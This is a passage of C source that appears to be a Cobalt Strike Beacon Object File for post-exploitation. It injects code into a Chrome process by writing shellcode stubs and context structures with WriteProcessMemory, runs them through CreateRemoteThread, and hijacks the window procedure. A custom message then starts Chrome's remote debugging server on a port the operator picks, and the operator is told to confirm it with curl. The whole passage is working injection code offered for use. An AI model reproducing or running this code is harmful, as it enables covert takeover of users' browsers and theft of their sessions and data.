    install_ctx_remote = (uintptr_t)remote_mem + 0x000;
    wnd_ctx_remote     = (uintptr_t)remote_mem + 0x040;
    install_stub_remote= (uintptr_t)remote_mem + 0x100;
    wnd_stub_remote    = (uintptr_t)remote_mem + 0x180;

    install_ctx.hwnd = (UINT64)(uintptr_t)hwnd;
    install_ctx.new_wndproc = (UINT64)wnd_stub_remote;
    install_ctx.set_window_long_ptr_a = (UINT64)set_window_long_ptr_a;

    wnd_ctx.old_wndproc = 0;
    wnd_ctx.set_window_long_ptr_a = (UINT64)set_window_long_ptr_a;
    wnd_ctx.start_remote_debugging_server = (UINT64)start_server;
    wnd_ctx.chrome_new = (UINT64)chrome_new;
    wnd_ctx.factory_vtable = (UINT64)factory_vtable;
    wnd_ctx.port = (UINT32)port;
    wnd_ctx.mode = 0;

    bof_memcpy(local_page + 0x000, &install_ctx, sizeof(install_ctx));
    bof_memcpy(local_page + 0x040, &wnd_ctx, sizeof(wnd_ctx));
    bof_memcpy(local_page + 0x100, INSTALL_STUB, sizeof(INSTALL_STUB));
    bof_memcpy(local_page + 0x180, WNDPROC_STUB_TEMPLATE, sizeof(WNDPROC_STUB_TEMPLATE));
    PatchQword(local_page + 0x180, 7, (UINT64)wnd_ctx_remote);

    if (!WriteProcessMemory(hProcess, remote_mem, local_page, total_size, &written) || written != total_size) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteProcessMemory failed: %lu", (unsigned long)GetLastError());
        HeapFree(GetProcessHeap(), 0, local_page);
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)install_stub_remote,
        (LPVOID)install_ctx_remote, 0, NULL);
    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateRemoteThread(install) failed: %lu", (unsigned long)GetLastError());
        HeapFree(GetProcessHeap(), 0, local_page);
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    WaitForSingleObject(hThread, 5000);
    GetExitCodeThread(hThread, &exit_code);
    CloseHandle(hThread);
    hThread = NULL;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Install stub exit code: %lu", (unsigned long)exit_code);

    if (!ReadProcessMemory(hProcess, (LPCVOID)install_ctx_remote, &install_ctx, sizeof(install_ctx), &written) ||
        written != sizeof(install_ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ReadProcessMemory(install_ctx) failed: %lu", (unsigned long)GetLastError());
        HeapFree(GetProcessHeap(), 0, local_page);
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Original WndProc = 0x%p", (void*)(uintptr_t)install_ctx.old_wndproc);

    wnd_ctx.old_wndproc = install_ctx.old_wndproc;
    if (!WriteProcessMemory(hProcess, (LPVOID)wnd_ctx_remote, &wnd_ctx, sizeof(wnd_ctx), &written) ||
        written != sizeof(wnd_ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteProcessMemory(wnd_ctx) failed: %lu", (unsigned long)GetLastError());
        HeapFree(GetProcessHeap(), 0, local_page);
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Sending trigger message 0x%X", WM_START_CDP_REMOTE);
    SendMessageA(hwnd, WM_START_CDP_REMOTE, 0, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Trigger sent. Validate with netstat or curl http://localhost:%d/json/version", port);

    HeapFree(GetProcessHeap(), 0, local_page);
    VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}